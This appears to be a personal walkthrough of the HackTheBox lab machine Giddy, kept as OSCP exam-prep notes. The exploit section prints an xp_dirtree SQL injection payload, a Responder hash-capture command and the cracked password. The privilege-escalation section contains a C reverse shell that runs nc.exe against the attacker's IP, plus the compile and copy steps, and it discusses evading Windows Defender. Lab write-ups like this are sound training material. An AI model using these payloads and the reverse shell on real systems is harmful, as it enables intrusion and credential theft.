# Giddy Walkthrough

Name: Giddy
Date:  8/5/2023
Difficulty:  Medium
Better Description:  
Goals:  OSCP Prep - Ippsec handholding to feel mentored
Learnt:
- Icacls is power
- I was really harsh on my self on trying this solo without looking at this and returning to this really the only issue is - SQLmap could havbe been used and in the real world it would have been.
- I was way too hard on myself when it was not my fault.
- Visual Studio 
- Building C Sharp project
- Wrestling with DotNet versions
- Infrastructure
- I forget my C roots ...I should return to C 

First the video is three years old and more tools are avaliable to me than to him way back then.

<iframe width="560" height="315" src="https://www.youtube.com/embed/J2unwbMQvUo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

![faceofmadness](Screenshots/faceofmaddness.png)
*"Stare into face of unknowable joy, absolute blankness and pure madness... the man that tried not using SQLmap...waiting for the Boolean to say if 1 of 10s of characters was correct."*

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Giddy/Screenshots/ping.png)

My returning ping for documentation
![](newping.png)

Having fun on attempt speed run without realising that this had responder in it and massive red flag for me generally as on the OSCP you do not need to ever you responder.
![](nmapunderstanding.png)

Added 
```bash
echo '10.129.96.140 giddy' | sudo tee -a /etc/hosts
```

![view-cert](Screenshots/view-cert.png)

Check the details! On return I found this
![](testpowershell.png)

Directory busting with feroxbuster:
![mvc](Screenshots/mvc-dir.png)

The remote page is exposed
![](furtherinspection.png)

I am proud of my enumeration now, but at the time I 3dissapointed.
![](gbtotheremote.png)

Checking out the main mvc product pagew
![](mvc.png)

SQLmap was consider on my second attempt as it is a no-use in OSCP exam...
![](andcommentreturnseverything.png)

Went to the page /mvc/Search.aspx and insta-search for`'`:
![sqlerror](Screenshots/sql-error.png)

![](sqliinjection.png)
I found the second time. 
![](sqliinjection.png)

One thing not noticed in the video `C:\Users\jnogueira\Downloads\owasp10\1-owasp-top10-m1-injection-exercise-files\before\1-Injection\Product.aspx.`
Ippsec demonstrated a more through methodology of testing for `--` aswell to see if it causes an error. Not using `sqlmap` till I finish OSCP.. so I tried it as this box is not on OSCP pwnlist got with id-sqli.req: 

![1080](id-sqli.png)

The union query is nuts and my guess is that an OSCP exam machine is not going to break you with statement that 3 lines long like this.
![](bigrequest.png)


## Exploit

Arbituary File Reading with xp_dirtree
```sql
declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test';exec master.dbo.xp_dirtree @q;--+
```

![catching](ncat.png)

```bash
responder -I tun0
```

![stacy](hashcapture.png)

Paused video to see if I could try pass the hash. I could not.

![cracked](cracked.png)

```
xNnWo6272k7x
```


## Foothold

Then from the `/remote` with: `giddy\stacy ; xNnWo6272k7x ; giddy`
![](unifivideo.png)

## PrivEsc

This directory is writable, see the 43390.txt poc.
![](icacls-unifi-video.png)

![msfail](xcopythemsfshell.png)

But..
![wd](windowsdefendstrikesagain.png)
Windows Defender removes it... 

Then I went on a research spree on C Sharp, Undetectable C sharp Reverse Shells and the best Windows-OS VM for ethical hacking for Archive. Returning months later I tried soloing this for a writeup and did not realise that I would really need SQLmap for this machine and then would have need Responder with `xp_cmdshell` so I am proud that I got as far as I did, but it also as a hindsight issue indicative of why some machines are bad for you the time for your growth and psychology. I actually crush the enumeration of the machine it is just blocked by tool usage that is not OSCP-related. Secondly I was really hard on myself with SQLinjection. The actual UNION based injection is three lines long and the other are blind and time-based so by all account the SQLi is one that you would only really get on a real assessment if you used SQLmap, because from all I have heard who actually has the time to do SQLi of that complexity on a time crunch without SQLmap in the 2020s.

![](simplerevshell.png)

Original I just open the file as you may be able to tell as I am not a .NET developer yet I have very, very miminal usege of Visual Studio. I spent more time building the install than using it at this point.  

1. Modify Ip address
2. `File -> Save` - Save your work

Create new Project
`Create NewProject  -> Console App -> Name`

Lose the Solution Explorer?
`Debug -> $nameofproject Debug Properties` at the very bottom of the drop down.

![](actuallybetter.png)

Change Target Framework, because...
`[Right Click]` the `[C#] $projectname` in `Solution Explorer` go to `Properties -> Target Framework`

Compile 
`Build -> Build Solution` 

[Overide the  Language Version](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/configure-language-version), because...
- Manually edit your [project file](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/configure-language-version#edit-the-project-file).
- Set the language version [for multiple projects in a subdirectory](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/configure-language-version#configure-multiple-projects).
- Configure the [**LangVersion** compiler option](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language#langversion).

I decided given my history with wrestling with applications to try the known good of Golang Reverse shell in place of Taskkill.exe
```powershell
impacket-smbserver share $(pwd)
# Copy 
xcopy \\10.10.14.17\share\taskkill.exe .
# List a Service with the Registry 
set-location 'HKLM:\SYSTEM\CurrentControlSet\Services'
get-childitem . # gci .
get-childitem . | select name
get-childitem . | where-object { $_.Name -like '*UniFiVideoService*'}
```

![](copyxgoshell.png)

Nope, but close
![](nopebutclose.png)
This did not work and fumbling with Visual Studios was not fun, but I try again today.  Quick reading [0xdf](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html#privesc-to-system) for context to finish machine as soon as possible bypassed Defender he opted for a [Ebowla](https://github.com/Genetic-Malware/Ebowla) to obscucate a msfvenom payload, which seems very last decade and need to sort out my C(#/++) building workflow and infrastructure. An eternity later... 

Although I know I did not use .NET 4.5 or below I had hard time so I just tried with .NET 7.0 just for the sake of my workflow.
![](saidtryondotnet7.png)

Given the fact I do not want to read hour of Visual Studio documentation if it change every year and some C sharp tool maybe ellispsed as all thing security given restriction of the monsters of insecurity Microsoft have made.

```powershell
Stop-Service "Uniquiti UniFi Video"
Start-Service "Ubiquiti UniFi Video"
Stop-Service "Uniquiti UniFi Video"
```

![](snowscan-ncandc.png)

Snowscan another top 10 HTB player (again simple solution is - like xct it always simplist first) is a program that runs nc.exe.  

```c
//#include "stdafx.h" speeds up compile time 
#include "stdlib.h"
// i686-w64-mingw32-gcc shell.c -o shell.exe

int main()
{
    system("nc.exe -e cmd.exe 10.10.14.23 4444");
    return 0;
}
```

Challenge now mingwc our way to success without knowing the exact version I think... So 
```bash
# Signin because timeout `giddy\stacy ; xNnWo6272k7x ; giddy`
i686-w64-mingw32-gcc shell.c -o /tmp/taskkill.exe
cp /usr/share/windows-resources/binaries/nc.exe /tmp/nc.exe
cd /tmp 
impacket-smbserver share $(pwd)
# Copy both
xcopy \\10.10.14.17\share\taskkill.exe .
xcopy \\10.10.14.17\share\nc.exe .

Start-Service "Ubiquiti UniFi Video"
Stop-Service "Uniquiti UniFi Video"
```

The power of C!
![](snowscanisawesome.png)

